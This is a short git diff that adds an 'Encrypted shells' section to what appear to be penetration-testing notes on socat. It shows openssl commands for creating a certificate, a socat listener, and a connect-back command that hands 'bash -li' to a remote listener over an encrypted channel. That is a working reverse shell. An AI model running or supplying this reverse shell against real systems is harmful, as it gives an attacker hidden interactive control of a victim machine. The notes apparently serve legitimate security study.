@@ -31,3 +31,14 @@ Socat must be installed on linux target. \
 - sigint, passes any Ctrl + C commands through into the sub-process, allowing us to kill commands inside the shell
 - setsid, creates the process in a new session
 - sane, stabilises the terminal, attempting to "normalise" it.
+
+## Encrypted shells
+Needs a cert on the listener. \
+`openssl req --newkey rsa:2048 -nodes -keyout shell.key -x509 -days 362 -out shell.crt` - creates 2048 bit rsa key with certificate valid almost a year \
+`cat shell.key shell.crt > shell.pem` - obtain key and cert in pem file
+
+**Listener** \
+``socat OPENSSL-LISTEN:<port>,cert=shell.pem,verify=0 FILE:`tty`,raw,echo=0`` \
+**Conn back** \
+`socat OPENSSL:<listener-ip>:<port>,verify=0 EXEC:"bash -li",pty,stderr,sigint,setsid,sane`
+
